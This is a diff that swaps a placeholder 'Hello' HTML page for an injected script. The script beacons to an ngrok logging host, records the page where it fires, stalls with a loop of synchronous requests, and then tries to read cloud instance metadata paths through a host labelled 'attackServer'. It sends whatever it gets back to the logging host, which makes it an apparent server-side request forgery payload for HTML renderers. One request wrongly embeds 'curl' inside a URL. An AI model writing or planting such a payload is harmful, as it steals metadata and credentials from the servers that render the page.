@@ -1,3 +1,36 @@
-<html>
-<h1>Hello</h1>
-</html>
+<script>
+var logTimeServer = 'd0ea-103-127-23-219.ngrok-free.app';
+var attackServer = 'ir3shio.github.io';
+
+function log(data) {
+    var sreq = new XMLHttpRequest();
+    sreq.open('GET', 'http://' + logTimeServer + '/log?msg=' + encodeURI(data), true);
+    sreq.send();
+}
+
+function get(url) {
+    try {
+        var req = new XMLHttpRequest();
+        req.open('GET', url, false);
+        req.send(null);
+        if(req.status == 200)
+            return req.responseText;
+        else
+            return '[failed status=' + req.status + ']';
+    } catch(err) {
+        log(err);
+    }
+    return null;
+}
+
+log('Triggered in ' + window.location.href);
+
+for(var i = 0; i < 60; ++i) {
+    log('Loop ' + i);
+    var req = new XMLHttpRequest();
+    req.open('GET', 'http://' + logTimeServer + '/', false);
+    req.send();
+}
+log('Meta Data: ' + get('curl http://' + attackServer + '/latest/meta-data/'));
+log('Hostname: ' + get('http://' + attackServer + '/latest/meta-data/local-hostname'));
+</script>
